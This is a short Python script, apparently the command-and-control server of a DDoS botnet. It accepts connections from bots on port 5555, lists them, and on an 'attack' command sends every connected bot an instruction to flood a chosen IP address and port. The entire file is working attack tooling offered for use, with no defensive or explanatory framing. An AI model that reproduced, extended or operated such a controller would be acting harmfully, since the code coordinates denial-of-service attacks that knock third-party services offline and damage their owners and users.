import socket

socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket_obj.bind(("0.0.0.0", 5555))
socket_obj.listen(100)

bots = []
print("[C2] Server ready on port 5555")

while True:
    try:
        socket_obj.settimeout(0.1)
        client, addr = socket_obj.accept()
        bots.append(client)
        print(f"[+] Bot connected from {addr[0]} - Total: {len(bots)}")
    except:
        pass
    
    cmd = input("\n[C2] > ")
    
    if cmd == "list":
        print(f"\nBots online: {len(bots)}")
        for i, bot in enumerate(bots):
            print(f"  Bot {i+1}: Connected")
    
    elif cmd.startswith("attack"):
        parts = cmd.split()
        if len(parts) == 3:
            _, target_ip, target_port = parts
            
            print(f"\n[!] LAUNCHING DDoS ATTACK")
            print(f"Target: {target_ip}:{target_port}")
            
            attack_msg = f"ATTACK|{target_ip}|{target_port}"
            success = 0
            
            for bot in bots[:]:
                try:
                    bot.send(attack_msg.encode())
                    success += 1
                except:
                    bots.remove(bot)
            
            print(f"[!] Command sent to {success} bots")
            print(f"[!] DDoS ATTACK IN PROGRESS on {target_ip}:{target_port}")
    
    elif cmd == "exit":
        print("Shutting down...")
        for bot in bots:
            bot.close()
        socket_obj.close()
        break
    
    else:
        print("Unknown command")